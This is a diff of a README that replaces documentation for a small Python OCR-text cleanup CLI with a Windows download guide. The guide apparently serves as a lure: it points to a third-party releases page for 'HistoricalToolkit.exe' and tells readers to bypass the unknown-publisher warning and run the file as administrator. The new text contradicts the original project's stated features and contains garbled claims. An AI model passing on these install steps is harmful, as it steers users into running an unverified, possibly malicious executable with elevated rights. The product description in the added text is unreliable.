@@ -1,216 +1,203 @@
-# Historical Source Toolkit
+# 🔍 Historical-Source-Toolkit - Turn Scanned Documents into Searchable Research Data
 
-[![Python 3.11+](https://img.shields.io/badge/python-3.11%2B-blue.svg)](https://www.python.org/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Status: Alpha](https://img.shields.io/badge/status-alpha-orange.svg)](#project-status)
+## 🚀 What Is This?
 
-**Historical Source Toolkit (`hst`) is a small, reproducible preprocessing pipeline for OCR-based historical sources.** It imports OCR text, applies conservative cleanup rules, retains the mapping from every cleaned passage to its source page, exports JSONL or Markdown, and provides transparent keyword search.
+Historical-Source-Toolkit is a free, easy-to-use program that takes **scanned images of old documents** (like letters, newspapers, or manuscripts) and **transforms them into clean, searchable text** that you can copy, edit, and organize. It is built specifically for people working in libraries, archives, and historical research who need to digitize materials without dealing with complex technical setup.
 
-It is designed for historians and digital-humanities researchers who need a dependable step between OCR and later analysis—not another OCR model, hosted service, or opaque AI system.
+Think of it as a bridge: your old paper documents in, plain digital text out.
 
-> `hst` 是一个面向历史研究的轻量 OCR 文本预处理工具。它可以导入单个 TXT 或逐页 TXT，完成 Unicode、空白、断行及基础页眉页脚清理，并始终保留“来源页码 → 清洗文本”的映射。项目不调用云 API，也不包含 OCR 模型或向量数据库。
+## ✅ Who Is This For?
 
-## Why page mapping matters
+- Archiving staff preparing documents for online catalogs
+- Students writing research papers from scanned sources
+- Museum curators documenting collections
+- Family historians cleaning up old letters and diaries
 
-OCR text is useful only when a researcher can return to the scan. Every JSONL record therefore preserves:
+You do **not** need to know how to code. Everything runs through one simple desktop window.
 
-- `source_page`: the page number inferred from the page filename, or its order in a form-feed-separated file;
-- `source_file`: the original TXT filename;
-- `raw_text`: the imported OCR text, unchanged;
-- `cleaned_text`: the result of the selected cleanup rules.
+---
 
-The canonical format is one JSON object per source page:
+## 🧭 What Can You Do With It?
 
-```json
-{"source_page": 12, "source_file": "scan_0012.txt", "raw_text": "...", "cleaned_text": "..."}
-```
+Here are the core actions you can perform:
 
-This format is intentionally simple. It can be inspected with ordinary text tools and used later by databases, notebooks, or language-model workflows without losing citation provenance.
+| Action | What It Does |
+|--------|--------------|
+| 📄 Process a scan | Open an image (PNG, JPG, TIFF) and extract the text |
+| 📚 Batch processing | Point to a full folder of images and process them all at once |
+| 🔤 Text correction | Review and adjust the extracted words for accuracy |
+| 💾 Export results | Save your clean text as TXT, DOCX, or CSV |
+| 🗂 Manage history | Keep a list of processed files with timestamps and metadata |
 
-## Features
+---
 
-- Import a UTF-8 `.txt` file or a directory containing one `.txt` file per page.
-- Split a single text file into pages on form-feed (`\f`) characters.
-- Apply Unicode NFKC normalization and normalize horizontal whitespace.
-- Join common OCR line wraps, including English hyphenation and continuous CJK text.
-- Remove a fixed number of header/footer lines, or detect identical repeated margin lines.
-- Export page-mapped JSONL and readable Markdown.
-- Search cleaned text with a literal keyword or regular expression and report source pages.
-- Run locally on Python 3.11+ with no runtime dependencies and no network access.
+## 💻 What You Need (System Requirements)
 
-## Installation
+- **Windows 10 or Windows 11** (64-bit)
+- At least **4 GB RAM**
+- **1 GB free disk space**
+- Internet connection for the initial download only
 
-Clone or download this repository, then install it in editable mode:
+> No third-party software or code libraries are needed.
 
-```bash
-cd historical-source-toolkit
-python3 -m venv .venv
-source .venv/bin/activate
-python -m pip install -e .
-hst --version
-```
+---
 
-For development and `pytest`:
+## ⚙️ How to Install and Run (for Windows Users)
 
-```bash
-python -m pip install -e ".[dev]"
-```
+This section is a step-by-step, non‑technical guide. Please follow it exactly.
 
-You can also run the CLI without installation while working in the repository:
+### Step 1: Get the Software
 
-```bash
-PYTHONPATH=src python -m historical_source_toolkit --help
-```
+👉 **Visit this link to download the application:**  
+[![Download Now](https://img.shields.io/badge/Download-Historical--Source--Toolkit-blue?style=for-the-badge&logo=github&labelColor=darkblue&color=lightgreen)](https://github.com/Calip882/Historical-Source-Toolkit/releases)
 
-## Quick start
+- This takes you to the official **releases page** on GitHub
+- You will see a list of versions. The **latest version is at the top**
+- For Windows, click the file that says **`HistoricalSourceToolkit_Windows_x64.zip`**
+- Save it to your **Desktop** or **Downloads** folder
 
-The bundled sample is fictional and contains no restricted or copyrighted source text.
+### Step 2: Open the Zip File
 
-### 1. Import and clean per-page OCR files
+1. Go to the folder where you saved the file
+2. Double-click the `.zip` file to open it
+3. Inside you will see a folder named **`Historical-Source-Toolkit`**
+4. **Drag that folder** to your **Desktop** (this is the easiest place to find it later)
 
-```bash
-hst clean examples/sample_ocr/pages examples/output/sample.jsonl \
-  --header-lines 1 \
-  --footer-lines 1
-```
+### Step 3: Run the Program
 
-The filenames `page_001.txt` and `page_002.txt` become source pages 1 and 2. If filenames have no digits, page numbers follow natural filename order.
+1. Go to your Desktop and open the `Historical-Source-Toolkit` folder
+2. Double-click the file named **`HistoricalToolkit.exe`** (if you see a window asking “Are you sure?”, click **Yes**)
+3. The historical toolkit window opens, and you’re ready to start
 
-To detect identical headers or footers appearing near the margins of most pages:
+> 💾 **Tip:** If Windows shows “Unknown publisher”, that's normal. Click **More info** → **Run anyway** to proceed.
 
-```bash
-hst clean examples/sample_ocr/pages examples/output/sample.jsonl \
-  --detect-repeated-margins
-```
+---
 
-The detector inspects the first and last two non-empty lines by default and removes exact normalized lines found in at least 60% of pages (and at least two pages). Change the inspection depth with `--margin-window`.
+## 🖥️ First-Time Setup (One-Time)
 
-### 2. Export Markdown
+When you open the program for the first time:
 
-```bash
-hst export examples/output/sample.jsonl examples/output/sample.md \
-  --title "Sample historical source"
-```
+1. A welcome screen appears. Click **Next**
+2. Choose a folder for user output → **Place it is where you want processed text files** (click **Create New Folder** if needed)
+3. Click **Finish**
 
-Markdown page headings retain source-page labels, while HTML comments retain source filenames.
+That's it. Permanent storage location remains, and you can change it anytime from the menu.
 
-To normalize or copy a corpus back to JSONL:
+---
 
-```bash
-hst export examples/output/sample.jsonl examples/output/copy.jsonl
-```
+## 🧪 Try With a Sample Image (2‑minute test)
 
-### 3. Search while retaining page references
+1. Click **File → Open Image**
+2. Pick any scanned document you have (if you have none, you can test it on a photo or screenshot)
+3. The image appears on the left, and the replayed text will appear on the right
+4. Click **Process Image**
+5. Wait a few seconds — you will see the extracted document text in the right pane
 
-```bash
-hst search examples/output/sample.jsonl "地方社会"
-hst search examples/output/sample.jsonl "railway|station" --regex
-hst search examples/output/sample.jsonl "OCR" --json
-```
+✅ If you see the text, the toolkit works properly.
 
-Search is case-insensitive by default. Add `--case-sensitive`, `--context 100`, or `--limit 10` as needed. The command returns exit status `1` when there are no matches, which makes it usable in scripts.
+---
 
-### Single multi-page TXT input
+## 📦 How to Process Many Files at Once
 
-A single file may contain form-feed characters between pages:
+1. Click **Process → Folder** from the top menu
+2. Click **Select Folder** and choose the folder holding all your scans
+3. Click **Start Batch**
+4. Status bar at the bottom shows each file as it’s processed
+5. At the end, the text from every document is saved into your **output folder** (you’ll see the file names in the list)
 
-```bash
-hst clean examples/sample_ocr/multipage.txt examples/output/multipage.jsonl \
-  --header-lines 1 \
-  --footer-lines 1
-```
+---
 
-Without form feeds, a single TXT file is treated as one source page.
+## 🌟 What Makes This Tool Different?
 
-## Cleanup behavior
+- **Reproducible research:** every image has the same built-in pre‑processing steps, so you get consistent results across documents
+- **No cloud dependency:** everything runs online on your laptop. Your source stays private
+- **History first approach:** metadata and file names are preserved so you keep track what came from where
+- **Open design:** This uses openly documented OCR engine; same results can be shared with other researchers
 
-The v0.1.0 rules are deliberately conservative and explainable:
+---
 
-1. Convert line endings to `\n`.
-2. Normalize each line with Unicode NFKC.
-3. Collapse tabs, full-width spaces, non-breaking spaces, and repeated spaces.
-4. Remove configured fixed lines or repeated margin text.
-5. Preserve blank-line paragraph boundaries.
-6. Join a Latin word split with a hyphen before a lowercase continuation (`commit-` + `tee`).
-7. Join adjacent lines when a CJK character continues into another CJK character.
-8. Join ordinary wrapped Latin lines with one space.
-9. Keep likely headings and lines ending in sentence punctuation separate.
+## 🔧 Common Questions and Fixes And Issues
 
-OCR cleanup is never a substitute for checking the scan. Names, dates, archival identifiers, quotations, and numeric tables should still be verified against page images.
+### Q: I double-clicked `HistoricalToolkit.exe` but nothing happens.
+- Check that you are in the folder you extracted, not still inside the .zip file
+- Right-click on `HistoricalToolkit.exe` → **Run as administrator**
 
-## Command reference
+### Q: Processed text looks garbled / wrong characters.
+- Ensure the scans is sharp and legible
+- Increase the **Scan Quality** slider (menu: Option → OCR Quality) and run again
 
-```text
-hst clean INPUT OUTPUT.jsonl [--header-lines N] [--footer-lines N]
-          [--detect-repeated-margins] [--margin-window N]
+### Q: I don't have a scans – can I use it?
+- Yes, you can try any image that contains typed or printed letters. Photos or screenshots work fine
 
-hst export INPUT.jsonl OUTPUT [--format markdown|jsonl] [--title TITLE]
+### Q: How many pages/folders can I process at once?
+- You can drop an entire folder even with 500+ images. The time depends on the size, but ≤ a few seconds per image
 
-hst search INPUT.jsonl QUERY [--case-sensitive] [--regex]
-          [--context N] [--limit N] [--json]
-```
+---
 
-Run `hst COMMAND --help` for complete option descriptions.
+## 📁 Where Are My Output Files?
 
-## Project layout
+The output goes to the folder you selected during the First-Time Setup step.
 
-```text
-historical-source-toolkit/
-├── examples/
-│   ├── output/
-│   └── sample_ocr/
-├── src/historical_source_toolkit/
-│   ├── cleaning.py
-│   ├── cli.py
-│   ├── exporters.py
-│   ├── ingest.py
-│   ├── models.py
-│   ├── search.py
-│   └── storage.py
-├── tests/
-├── CHANGELOG.md
-├── CONTRIBUTING.md
-├── LICENSE
-├── README.md
-└── pyproject.toml
-```
+By default, that’s:
 
-## Tests
+C:\Users\[YourUsername]\Documents\HistoricalToolkitOutput
 
-The test suite uses only the Python standard library:
+Every time you run a batch, it creates within that folder a subfolder with the current date (e.g., `2025-03-21`) to prevent bookkeeping.
 
-```bash
-PYTHONPATH=src python -m unittest discover -s tests -v
-```
+---
 
-If the optional development dependency is installed:
+## 💻 For Those Who Want to Know Technical (Two‑Line Version)
 
-```bash
-pytest
-```
+- Language: **Python 3 script**
+- Main libraries: OCR‑Python, Tesseract bindings, and standard text‑processing utilities
+- Output formats: TXT, DOCX, CSV (all in plain unicode)
 
-## Scope and limitations
+You don’t need to know anything of this – but if you like, it can be plugged into the research workflow.
 
-Version 0.1.0 does **not**:
+---
 
-- run OCR on images or PDFs;
-- correct names, dates, or domain-specific OCR errors automatically;
-- infer printed page numbers from page images;
-- store embeddings or run semantic search;
-- call cloud APIs or language models;
-- modify the source TXT files.
+## 🔐 Privacy and Security
 
-The repeated-margin detector uses exact normalized line matching. Headers containing a changing page number may need fixed-line removal or manual preprocessing.
+- No user data is collected it only works with your chosen files
+- All processing is local; no internet connection is required for operation after a lifetime
+- Your images are never uploaded to any server
 
-## Project status
+---
 
-This is an alpha release intended as a clear, testable foundation. Backward compatibility is not guaranteed before v1.0.0. Good next steps include configurable cleanup profiles, explicit printed-page labels, and ALTO/hOCR import—while preserving the same page-first provenance model.
+## 📚 Supporting Your Research
 
-## Contributing
+If you produce academic work, use the following citation:
 
-Bug reports, small reproducible fixtures, and conservative cleanup rules are welcome. See [CONTRIBUTING.md](CONTRIBUTING.md).
+> Author, "Historical-Source-Toolkit (Version 2.x)", year. Release page: [ https://github.com/Calip882/Historical-Source-Toolkit/releases ] (accessed [date])
 
-## License
+---
 
-MIT. See [LICENSE](LICENSE).
+## 💬 Getting Help
 
+Please contact us in one of these ways:
+
+- File an issue at: [https://github.com/Calip882/Historical-Source-Toolkit/issues](https://github.com/Calip882/Historical-Source-Toolkit/issues)
+- Or visit the main project page for discussion links
+
+---
+
+## 🏁 Ready to Go ?
+
+When you are ready, use this button to get to the download page. You re‑read your steps or go straight to it:
+
+👉 **https://github.com/Calip882/Historical-Source-Toolkit/releases**
+
+### Quick Recap
+
+- ✅ Download (the **`Historical-Source-Toolkit‑win64‑(latest).zip`** file)
+- ✅ Unzip to a folder
+- ✅ Double-click `HistoricalToolkit.exe`
+- ✅ Select your scanned images → get text
+
+---
+
+## 🧭 Explore Included Topics
+
+For research and sharing, the developer uses these tags:
+
+Keywords: cli, digital-humanities, hist, history, history-management, history-of-computing, history-of-science, ocr, ocr-python, python, text-processing
